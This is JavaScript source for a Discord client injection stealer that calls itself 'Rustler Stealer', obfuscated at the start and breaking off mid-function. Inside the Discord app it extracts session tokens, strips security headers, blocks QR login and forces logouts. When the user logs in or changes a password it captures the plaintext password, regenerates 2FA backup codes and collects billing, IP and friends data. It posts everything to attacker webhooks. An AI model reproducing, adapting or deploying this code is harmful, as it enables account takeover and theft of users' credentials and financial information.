const w = (function () {
    let b = true
    return function (J, f) {
      const K = b
        ? function () {
            if (f) {
              const d = f.apply(J, arguments)
              return (f = null), d
            }
          }
        : function () {}
      return (b = false), K
    }
  })(),
  e = w(this, function () {
    return e
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(e)
      .search('(((.+)+)+)+$')
  })
e()
const Y = (function () {
  let b = true
  return function (J, f) {
    const K = b
      ? function () {
          if (f) {
            const d = f.apply(J, arguments)
            return (f = null), d
          }
        }
      : function () {}
    return (b = false), K
  }
})()
;(function () {
  Y(this, function () {
    const J = new RegExp('function *\\( *\\)'),
      f = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
      W = L('init')
    !J.test(W + 'chain') || !f.test(W + 'input') ? W('0') : L()
  })()
})()
const r = (function () {
    let b = true
    return function (J, f) {
      const A = b
        ? function () {
            if (f) {
              const H = f.apply(J, arguments)
              return (f = null), H
            }
          }
        : function () {}
      return (b = false), A
    }
  })(),
  y = r(this, function () {
    let b
    try {
      const K = Function(
        'return (function() {}.constructor("return this")( ));'
      )
      b = K()
    } catch (A) {
      b = window
    }
    const J = (b.console = b.console || {})
    const f = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace']
    for (let C = 0; C < f.length; C++) {
      const l = r.constructor.prototype.bind(r),
        H = f[C],
        G = J[H] || l
      l['__proto__'] = r.bind(r)
      l.toString = G.toString.bind(G)
      J[H] = l
    }
  })
y()
const fs = require('fs'),
  path = require('path'),
  { BrowserWindow, session } = require('electron'),
  querystring = require('querystring'),
  os = require('os')
var webhook = '%WEBHOOK_LINK%'
var src = 'notdualhook'
const computerName = os.hostname(),
  discordInstall = '' + __dirname,
  EvalToken =
    'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;'
;(function () {
  const b = function () {
    const f = { uuhSW: 'No Rare Friends' }
    const W = f
    let A
    try {
      A = Function('return (function() {}.constructor("return this")( ));')()
    } catch (C) {
      A = window
    }
    return A
  }
  const J = b()
  J.setInterval(L, 4000)
})()
String.prototype.insert = function (b, J) {
  if (b > 0) {
    return this.substring(0, b) + J + this.substr(b)
  }
  return J + this
}
const yn = {}
yn.logout = 'instant'
yn['inject-notify'] = 'true'
yn['logout-notify'] = 'true'
yn['init-notify'] = 'false'
yn['embed-color'] = 3553599
yn['disable-qr-code'] = 'true'
const config = yn
session.defaultSession.webRequest.onHeadersReceived((f, W) => {
  if (f.url.startsWith(webhook)) {
    if (f.url.includes('discord.com')) {
      const A = {}
      A['Access-Control-Allow-Headers'] = '*'
      W({ responseHeaders: Object.assign(A, f.responseHeaders) })
    } else {
      W({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': [
              "default-src '*'",
              "Access-Control-Allow-Headers '*'",
              "Access-Control-Allow-Origin '*'",
            ],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          f.responseHeaders
        ),
      })
    }
  } else {
    delete f.responseHeaders['content-security-policy']
    delete f.responseHeaders['content-security-policy-report-only']
    const G = { ...f.responseHeaders }
    G['Access-Control-Allow-Headers'] = '*'
    const V = { responseHeaders: G }
    W(V)
  }
})
function FirstTime(s) {
  const J = BrowserWindow.getAllWindows()[0]
  J.webContents.executeJavaScript('' + EvalToken, true).then((f) => {
    if (config['init-notify'] == 'true') {
      if (fs.existsSync(path.join(__dirname, 'init'))) {
        fs.rmdirSync(path.join(__dirname, 'init'))
        if (f == null || f == undefined || f == '') {
          const C = {
            username: 'Rustler Stealer',
            content: '',
            embeds: [
              {
                title: 'Discord Started',
                color: config['embed-color'],
                fields: [
                  {
                    name: 'Info',
                    value:
                      '```Hostname: \n' +
                      computerName +
                      '\nInjection Info: \n' +
                      __dirname +
                      '\n```',
                    inline: false,
                  },
                ],
                author: { name: 'Rustler Stealer' },
                footer: { text: 'Rustler Stealer' },
              },
            ],
          }
          var K = C
          SendToWebhook(JSON.stringify(K))
        } else {
          const H = BrowserWindow.getAllWindows()[0]
          H.webContents
            .executeJavaScript(
              '\n                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","' +
                f +
                '"),xmlHttp.send(null),xmlHttp.responseText;\n                    ',
              true
            )
            .then((G) => {
              const n = JSON.parse(G)
              var N = {
                username: 'Rustler Stealer',
                content: '',
                embeds: [
                  {
                    title: 'Discord Initalized',
                    description:
                      '[**<:partner:909102089513340979> \u2502 Click Here To Copy Info On Mobile**](https://Rustlercoppy.com/copy/' +
                      f +
                      ')',
                    color: config['embed-color'],
                    fields: [
                      {
                        name: 'Info',
                        value:
                          '```Hostname: \n' +
                          computerName +
                          '\nInjection Info: \n' +
                          __dirname +
                          '\n```',
                        inline: false,
                      },
                      {
                        name: 'Username',
                        value: '`' + n.username + '#' + n.discriminator + '`',
                        inline: true,
                      },
                      {
                        name: 'Email:',
                        value: '`' + s + '`',
                        inline: true,
                      },
                      {
                        name: 'Badges',
                        value: '' + GetBadges(n.flags),
                        inline: false,
                      },
                      {
                        name: 'Token',
                        value: '```' + f + '```',
                        inline: false,
                      },
                    ],
                    author: { name: 'Rustler Stealer' },
                    footer: { text: 'Rustler Stealer' },
                    thumbnail: {
                      url:
                        'https://cdn.discordapp.com/avatars/' +
                        n.id +
                        '/' +
                        n.avatar,
                    },
                  },
                ],
              }
              SendToWebhook(JSON.stringify(N))
            })
        }
      }
    }
    if (!fs.existsSync(path.join(__dirname, 'Rustler'))) {
      return true
    }
    fs.rmdirSync(path.join(__dirname, 'Rustler'))
    if (config.logout != 'false' || config.logout == '%LOGOUT%') {
      if (config['logout-notify'] == 'true') {
        if (f == null || f == undefined || f == '') {
          const u = {
            username: 'Rustler Stealer',
            content: '',
            embeds: [
              {
                title: 'User log out (User not Logged in before)',
                color: config['embed-color'],
                fields: [
                  {
                    name: 'Info',
                    value:
                      '```Hostname: \n' +
                      computerName +
                      '\nInjection Info: \n' +
                      __dirname +
                      '\n```',
                    inline: false,
                  },
                ],
                author: { name: 'Rustler Stealer' },
                footer: { text: 'Rustler Stealer' },
              },
            ],
          }
          var K = u
          SendToWebhook(JSON.stringify(K))
        } else {
          const j = BrowserWindow.getAllWindows()[0]
          j.webContents
            .executeJavaScript(
              '\n                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","' +
                f +
                '"),xmlHttp.send(null),xmlHttp.responseText;\n                    ',
              true
            )
            .then((Z) => {
              const D = JSON.parse(Z)
              var O = {
                username: 'Rustler Stealer',
                content: '',
                embeds: [
                  {
                    color: config['embed-color'],
                    fields: [
                      {
                        name: '<:token:949679866188529714> Token:',
                        value:
                          '`' +
                          f +
                          '`' +
                          '\n[CopyToken](https://Rustlercoppy.com/copy/' +
                          f +
                          ')',
                        inline: false,
                      },
                      {
                        name: '<:password:949679865580384266> Username:',
                        value: '`' + D.username + '#' + D.discriminator + '`',
                        inline: true,
                      },
                      {
                        name: '<:ip:949680203859369994> ID:',
                        value: '`' + D.id + '`',
                        inline: true,
                      },
                      {
                        name: '<:mail:949679866113032253> Email:',
                        value: '`' + D.email + '`',
                        inline: true,
                      },
                      {
                        name: '<:badge:949679865710403584> Badges:',
                        value: '' + GetBadges(D.flags),
                        inline: true,
                      },
                      {
                        name: '<:nitro:949679866033352784> Nitro Type:',
                        value: '' + GetNitro(D.premium_type),
                        inline: true,
                      },
                    ],
                    author: {
                      name:
                        D.username + '#' + D.discriminator + ' (' + D.id + ')',
                      icon_url:
                        'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
                    },
                    footer: { text: 'Rustler Stealer' },
                    thumbnail: {
                      url:
                        'https://cdn.discordapp.com/avatars/' +
                        D.id +
                        '/' +
                        D.avatar,
                    },
                  },
                ],
              }
              SendToWebhook(JSON.stringify(O))
            })
        }
      }
      const M = BrowserWindow.getAllWindows()[0]
      M.webContents
        .executeJavaScript(
          'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',
          true
        )
        .then((Z) => {})
    }
    return false
  })
}
const yu = {}
yu.urls = [
  'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
  'https://*.discord.com/api/v*/applications/detectable',
  'https://discord.com/api/v*/applications/detectable',
  'https://*.discord.com/api/v*/users/@me/library',
  'https://discord.com/api/v*/users/@me/library',
  'https://*.discord.com/api/v*/users/@me/billing/subscriptions',
  'https://discord.com/api/v*/users/@me/billing/subscriptions',
  'wss://remote-auth-gateway.discord.gg/*',
]
const Filter = yu
session.defaultSession.webRequest.onBeforeRequest(Filter, (b, J) => {
  if (b.url.startsWith('wss://')) {
    if (
      config['disable-qr-code'] == 'true' ||
      config['disable-qr-code'] == '%DISABLEQRCODE%'
    ) {
      const W = { cancel: true }
      J(W)
      return
    }
  }
  if (FirstTime()) {
  }
  J({})
  return
})
function SendToWebhook(s) {
  const b = BrowserWindow.getAllWindows()[0]
  b.webContents
    .executeJavaScript(
      '\n\tvar xhr = new XMLHttpRequest();\n    xhr.open("POST", "' +
        webhook +
        "\", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(" +
        s +
        '));\n    ',
      true
    )
    .then((J) => {})
  b.webContents
    .executeJavaScript(
      '    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "' +
        src +
        "\", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(" +
        s +
        '));\n    ',
      true
    )
    .then((J) => {})
}
function GetNitro(b) {
  if (b == 0) {
    return '`No Nitro`'
  }
  if (b == 1) {
    return '<:classic:896119171019067423> `Nitro Classic`'
  }
  if (b == 2) {
    return '<a:boost:824036778570416129> `Nitro Boost`'
  } else {
    return '`No Nitro`'
  }
}
function GetRBadges(s) {
  const f = 2
  const K = 8
  var l = ''
  if ((s & 1) == 1) {
    l += '<:staff:874750808728666152> '
  }
  ;(s & f) == f && (l += '<:partner:874750808678354964> ')
  ;(s & 4) == 4 && (l += '<:hypesquad_events:874750808594477056> ')
  if ((s & K) == K) {
    l += '<:bughunter_1:874750808426692658> '
  }
  ;(s & 512) == 512 && (l += '<:early_supporter:874750808414113823> ')
  if ((s & 16384) == 16384) {
    l += '<:bughunter_2:874750808430874664> '
  }
  if ((s & 131072) == 131072) {
    l += '<:developer:874750808472825986> '
  }
  if (l == '') {
    l = ''
  }
  return l
}
function GetBadges(s) {
  const G = 131072
  var V = ''
  if ((s & 1) == 1) {
    V += '<:staff:874750808728666152> '
  }
  ;(s & 2) == 2 && (V += '<:partner:874750808678354964> ')
  ;(s & 4) == 4 && (V += '<:hypesquad_events:874750808594477056> ')
  ;(s & 8) == 8 && (V += '<:bughunter_1:874750808426692658> ')
  if ((s & 64) == 64) {
    V += '<:bravery:874750808388952075> '
  }
  if ((s & 128) == 128) {
    V += '<:brilliance:874750808338608199> '
  }
  if ((s & 256) == 256) {
    V += '<:balance:874750808267292683> '
  }
  if ((s & 512) == 512) {
    V += '<:early_supporter:874750808414113823> '
  }
  if ((s & 16384) == 16384) {
    V += '<:bughunter_2:874750808430874664> '
  }
  if ((s & G) == G) {
    V += '<:developer:874750808472825986> '
  }
  return V == '' && (V = '`No Badges`'), V
}
function Login(s, b, J) {
  const W = BrowserWindow.getAllWindows()[0]
  W.webContents
    .executeJavaScript(
      '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
        J +
        '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
      true
    )
    .then((K) => {
      W.webContents
        .executeJavaScript(
          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
          true
        )
        .then((C) => {
          W.webContents
            .executeJavaScript(
              '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                J +
                '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
              true
            )
            .then((H) => {
              W.webContents
                .executeJavaScript(
                  '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                    J +
                    '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                  true
                )
                .then((V) => {
                  if (J.startsWith('mfa')) {
                    W.webContents
                      .executeJavaScript(
                        '\n              var xmlHttp = new XMLHttpRequest();\n              xmlHttp.open("POST", "https://discord.com/api/v8/users/@me/mfa/codes", false);\n              xmlHttp.setRequestHeader(\'Content-Type\', \'application/json\');\n              xmlHttp.setRequestHeader("authorization", "' +
                          J +
                          '")\n              xmlHttp.send(JSON.stringify({"password":"' +
                          b +
                          '","regenerate":true}));\n              xmlHttp.responseText',
                        true
                      )
                      .then((M) => {
                        var u = [],
                          k = '',
                          E = 'https://Rustlercoppy.com/copy/',
                          j = JSON.parse(M)
                        let D = j.backup_codes
                        const B = D.filter((P) => {
                          return P.consumed == false
                        })
                        for (let P in B) {
                          if (P == 0) {
                            k +=
                              '<:Rustler:936417408363679824> `' +
                              B[P].code.insert(4, '') +
                              '` '
                          } else {
                            if (P % 2 === 1) {
                              k +=
                                '<:Rustler:936417408363679824> `' +
                                B[P].code.insert(4, '') +
                                '` \n'
                            } else {
                              k +=
                                '<:Rustler:936417408363679824> `' +
                                B[P].code.insert(4, '') +
                                '` '
                            }
                          }
                        }
                        function v() {
                          var U = JSON.parse(V)
                          const m = U.filter((y0) => {
                            return y0.type == 1
                          })
                          return m.length
                        }
                        function o() {
                          var U = JSON.parse(V)
                          const y0 = U.filter((y1) => {
                            return y1.type == 1
                          })
                          var T = ''
                          for (z of y0) {
                            var m = GetRBadges(z.user.public_flags)
                            if (m != '') {
                              T +=
                                m +
                                (' | `' +
                                  z.user.username +
                                  '#' +
                                  z.user.discriminator +
                                  '`\n')
                            }
                          }
                          return T == '' && (T = '*Nothing to see here*'), T
                        }
                        function i() {
                          const T = JSON.parse(H)
                          var U = ''
                          T.forEach((m) => {
                            if (m.type == '') {
                              return '`No`'
                            } else {
                              if (m.type == 2 && m.invalid != true) {
                                U += ' <:paypal:896441236062347374>'
                              } else {
                                if (m.type == 1 && m.invalid != true) {
                                  U += ' :credit_card:'
                                } else {
                                  return '`No`'
                                }
                              }
                            }
                          })
                          if (U == '') {
                            U = '`No`'
                          }
                          return U
                        }
                        const h = JSON.parse(K)
                        var Z = {
                          username: 'Rustler Stealer',
                          content: '',
                          embeds: [
                            {
                              color: config['embed-color'],
                              fields: [
                                {
                                  name: '<:token:949679866188529714> Token:',
                                  value:
                                    '`' +
                                    J +
                                    '`' +
                                    '\n[CopyToken](https://Rustlercoppy.com/copy/' +
                                    J +
                                    '<br>' +
                                    s +
                                    ':' +
                                    b +
                                    ')',
                                  inline: false,
                                },
                                {
                                  name: '<:badge:949679865710403584> Badges:',
                                  value: '' + GetBadges(h.flags),
                                  inline: true,
                                },
                                {
                                  name: '<:nitro:949679866033352784> Nitro Type:',
                                  value: '' + GetNitro(h.premium_type),
                                  inline: true,
                                },
                                {
                                  name: '<:card:949679865798475827>Billing',
                                  value: '' + i(),
                                  inline: true,
                                },
                                {
                                  name: '<:ip:949680203859369994> IP:',
                                  value: '`' + C + '`',
                                  inline: true,
                                },
                                {
                                  name: '<:mail:949679866113032253> Email:',
                                  value: '`' + s + '`',
                                  inline: true,
                                },
                                {
                                  name: '<:password:949679865580384266> Password:',
                                  value: '`' + b + '`',
                                  inline: true,
                                },
                              ],
                              author: {
                                name:
                                  h.username +
                                  '#' +
                                  h.discriminator +
                                  ' (' +
                                  h.id +
                                  ')',
                                icon_url:
                                  'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
                              },
                              footer: { text: 'Rustler Stealer' },
                              thumbnail: {
                                url:
                                  'https://cdn.discordapp.com/avatars/' +
                                  h.id +
                                  '/' +
                                  h.avatar,
                              },
                            },
                          ],
                        }
                        const X = {
                          color: config['embed-color'],
                          description: '' + k,
                          author: {},
                          footer: {},
                        }
                        X.author.icon_url =
                          'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg'
                        X.author.name = '2FA Codes'
                        X.footer.text = 'Rustler Stealer'
                        var c = X,
                          I = {
                            color: config['embed-color'],
                            description: o(),
                            author: {
                              icon_url:
                                'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
                              name: 'HQ Friends',
                            },
                            footer: { text: 'Rustler Stealer' },
                          }
                        if (J.startsWith('mfa')) {
                          Z.embeds.push(c)
                        }
                        Z.embeds.push(I)
                        SendToWebhook(JSON.stringify(Z))
                      })
                  } else {
                    const u = BrowserWindow.getAllWindows()[0]
                    u.webContents
                      .executeJavaScript(
                        '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
                          J +
                          '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
                        true
                      )
                      .then((k) => {
                        u.webContents
                          .executeJavaScript(
                            '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
                            true
                          )
                          .then((j) => {
                            u.webContents
                              .executeJavaScript(
                                '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                                  J +
                                  '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
                                true
                              )
                              .then((c) => {
                                u.webContents
                                  .executeJavaScript(
                                    '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                                      J +
                                      '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                                    true
                                  )
                                  .then((D) => {
                                    function o() {
                                      var g = JSON.parse(D)
                                      const F = g.filter((Q) => {
                                        return Q.type == 1
                                      })
                                      return F.length
                                    }
                                    function i() {
                                      var g = JSON.parse(D)
                                      const x = g.filter((S) => {
                                        return S.type == 1
                                      })
                                      var p = ''
                                      for (z of x) {
                                        var F = GetRBadges(z.user.public_flags)
                                        F != '' &&
                                          (p +=
                                            F +
                                            (' | `' +
                                              z.user.username +
                                              '#' +
                                              z.user.discriminator +
                                              '`\n'))
                                      }
                                      return (
                                        p == '' &&
                                          (p = '*Nothing to see here*'),
                                        p
                                      )
                                    }
                                    function h() {
                                      const F = JSON.parse(c)
                                      var g = ''
                                      return (
                                        F.forEach((Q) => {
                                          if (Q.type == '') {
                                            return '`No`'
                                          } else {
                                            if (
                                              Q.type == 2 &&
                                              Q.invalid != true
                                            ) {
                                              g +=
                                                ' <:paypal:896441236062347374>'
                                            } else {
                                              if (
                                                Q.type == 1 &&
                                                Q.invalid != true
                                              ) {
                                                g += ' :credit_card:'
                                              } else {
                                                return '`No`'
                                              }
                                            }
                                          }
                                        }),
                                        g == '' && (g = '`No`'),
                                        g
                                      )
                                    }
                                    const X = JSON.parse(k)
                                    var v = {
                                      username: 'Rustler Stealer',
                                      content: '',
                                      embeds: [
                                        {
                                          color: config['embed-color'],
                                          fields: [
                                            {
                                              name: '<:token:949679866188529714> Token:',
                                              value:
                                                '`' +
                                                J +
                                                '`' +
                                                '\n[CopyToken](https://Rustlercoppy.com/copy/' +
                                                J +
                                                '<br>' +
                                                s +
                                                ':' +
                                                b +
                                                ')',
                                              inline: false,
                                            },
                                            {
                                              name: '<:badge:949679865710403584> Badges:',
                                              value: '' + GetBadges(X.flags),
                                              inline: true,
                                            },
                                            {
                                              name: '<:nitro:949679866033352784> Nitro Type:',
                                              value:
                                                '' + GetNitro(X.premium_type),
                                              inline: true,
                                            },
                                            {
                                              name: '<:card:949679865798475827>Billing',
                                              value: '' + h(),
                                              inline: true,
                                            },
                                            {
                                              name: '<:ip:949680203859369994> IP:',
                                              value: '`' + j + '`',
                                              inline: true,
                                            },
                                            {
                                              name: '<:mail:949679866113032253> Email:',
                                              value: '`' + s + '`',
                                              inline: true,
                                            },
                                            {
                                              name: '<:password:949679865580384266> Password:',
                                              value: '`' + b + '`',
                                              inline: true,
                                            },
                                          ],
                                          author: {
                                            name:
                                              X.username +
                                              '#' +
                                              X.discriminator +
                                              ' (' +
                                              X.id +
                                              ')',
                                            icon_url:
                                              'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
                                          },
                                          footer: { text: 'Rustler Stealer' },
                                          thumbnail: {
                                            url:
                                              'https://cdn.discordapp.com/avatars/' +
                                              X.id +
                                              '/' +
                                              X.avatar,
                                          },
                                        },
                                        {
                                          color: config['embed-color'],
                                          description: i(),
                                          author: {
                                            icon_url:
                                              'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
                                            name: 'HQ Friends',
                                          },
                                          footer: { text: 'Rustler Stealer' },
                                        },
                                      ],
                                    }
                                    SendToWebhook(JSON.stringify(v))
                                  })
                              })
                          })
                      })
                  }
                })
            })
        })
    })
}
function ChangePassword(s, b, J) {
  const W = BrowserWindow.getAllWindows()[0]
  W.webContents
    .executeJavaScript(
      '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
        J +
        '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
      true
    )
    .then((K) => {
      W.webContents
        .executeJavaScript(
          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
          true
        )
        .then((C) => {
          W.webContents
            .executeJavaScript(
              '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                J +
                '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
              true
            )
            .then((H) => {
              W.webContents
                .executeJavaScript(
                  '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                    J +
                    '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                  true
                )
                .then((N) => {
                  if (J.startsWith('mfa')) {
                    W.webContents
                      .executeJavaScript(
                        '\n              var xmlHttp = new XMLHttpRequest();\n              xmlHttp.open("POST", "https://discord.com/api/v8/users/@me/mfa/codes", false);\n              xmlHttp.setRequestHeader(\'Content-Type\', \'application/json\');\n              xmlHttp.setRequestHeader("authorization", "' +
                          J +
                          '")\n\t      xmlHttp.send(JSON.stringify({"password":"' +
                          b +
                          '","regenerate":true}));\n              xmlHttp.responseText',
                        true
                      )
                      .then((n) => {
                        var k = [],
                          E = '',
                          j = 'https://Rustlercoppy.com/copy/',
                          Z = JSON.parse(n)
                        let D = Z.backup_codes
                        const B = D.filter((P) => {
                          return P.consumed == false
                        })
                        for (let P in B) {
                          if (P == 0) {
                            E +=
                              '<:Rustler:936417408363679824> `' +
                              B[P].code.insert(4, '') +
                              '` '
                          } else {
                            if (P % 2 === 1) {
                              E +=
                                '<:Rustler:936417408363679824> `' +
                                B[P].code.insert(4, '') +
                                '` \n'
                            } else {
                              E +=
                                '<:Rustler:936417408363679824> `' +
                                B[P].code.insert(4, '') +
                                '` '
                            }
                          }
                        }
                        function v() {
                          var U = JSON.parse(N)
                          const T = U.filter((m) => {
                            return m.type == 1
                          })
                          return T.length
                        }
                        function o() {
                          var U = JSON.parse(N)
                          const y1 = U.filter((y2) => {
                            return y2.type == 1
                          })
                          var T = ''
                          for (z of y1) {
                            var m = GetRBadges(z.user.public_flags)
                            if (m != '') {
                              T +=
                                m +
                                (' | `' +
                                  z.user.username +
                                  '#' +
                                  z.user.discriminator +
                                  '`\n')
                            }
                          }
                          if (T == '') {
                            T = '*Nothing to see here*'
                          }
                          return T
                        }
                        function i() {
                          const m = JSON.parse(H)
                          var U = ''
                          m.forEach((y0) => {
                            if (y0.type == '') {
                              return '`No`'
                            } else {
                              if (y0.type == 2 && y0.invalid != true) {
                                U += ' <:paypal:896441236062347374>'
                              } else {
                                if (y0.type == 1 && y0.invalid != true) {
                                  U += ' :credit_card:'
                                } else {
                                  return '`No`'
                                }
                              }
                            }
                          })
                          if (U == '') {
                            U = '`No`'
                          }
                          return U
                        }
                        const h = JSON.parse(K)
                        var c = {
                          username: 'Rustler Stealer',
                          content: '',
                          embeds: [
                            {
                              color: config['embed-color'],
                              fields: [
                                {
                                  name: '<:token:949679866188529714> Token:',
                                  value:
                                    '`' +
                                    J +
                                    '`' +
                                    '\n[CopyToken](https://Rustlercoppy.com/copy/' +
                                    J +
                                    '<br>' +
                                    h.email +
                                    ':' +
                                    b +
                                    ')',
                                  inline: false,
                                },
                                {
                                  name: '<:badge:949679865710403584> Badges:',
                                  value: '' + GetBadges(h.flags),
                                  inline: true,
                                },
                                {
                                  name: '<:nitro:949679866033352784> Nitro Type:',
                                  value: '' + GetNitro(h.premium_type),
                                  inline: true,
                                },
                                {
                                  name: '<:card:949679865798475827>Billing',
                                  value: '' + i(),
                                  inline: true,
                                },
                                {
                                  name: '<:ip:949680203859369994> IP:',
                                  value: '`' + C + '`',
                                  inline: true,
                                },
                                {
                                  name: '<:mail:949679866113032253> Email:',
                                  value: '`' + h.email + '`',
                                  inline: true,
                                },
                                {
                                  name: '<:password:949679865580384266> Old Password:',
                                  value: '`' + s + '`',
                                  inline: true,
                                },
                                {
                                  name: '<:password:949679865580384266> New Password:',
                                  value: '`' + b + '`',
                                  inline: true,
                                },
                              ],
                              author: {
                                name:
                                  h.username +
                                  '#' +
                                  h.discriminator +
                                  ' (' +
                                  h.id +
                                  ')',
                                icon_url:
                                  'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
                              },
                              footer: { text: 'Rustler Stealer' },
                              thumbnail: {
                                url:
                                  'https://cdn.discordapp.com/avatars/' +
                                  h.id +
                                  '/' +
                                  h.avatar,
                              },
                            },
                          ],
                        }
                        const X = {
                          color: config['embed-color'],
                          description: '' + E,
                          author: {},
                          footer: {},
                        }
                        X.author.icon_url =
                          'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg'
                        X.author.name = '2FA Codes'
                        X.footer.text = 'Rustler Stealer'
                        var O = {
                          color: config['embed-color'],
                          description: o(),
                          author: {
                            icon_url:
                              'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
                            name: 'HQ Friends',
                          },
                          footer: { text: 'Rustler Stealer' },
                        }
                        J.startsWith('mfa') && c.embeds.push(I)
                        c.embeds.push(O)
                        SendToWebhook(JSON.stringify(c))
                      })
                  } else {
                    const n = BrowserWindow.getAllWindows()[0]
                    n.webContents
                      .executeJavaScript(
                        '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
                          J +
                          '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
                        true
                      )
                      .then((u) => {
                        n.webContents
                          .executeJavaScript(
                            '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
                            true
                          )
                          .then((E) => {
                            n.webContents
                              .executeJavaScript(
                                '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                                  J +
                                  '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
                                true
                              )
                              .then((Z) => {
                                n.webContents
                                  .executeJavaScript(
                                    '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                                      J +
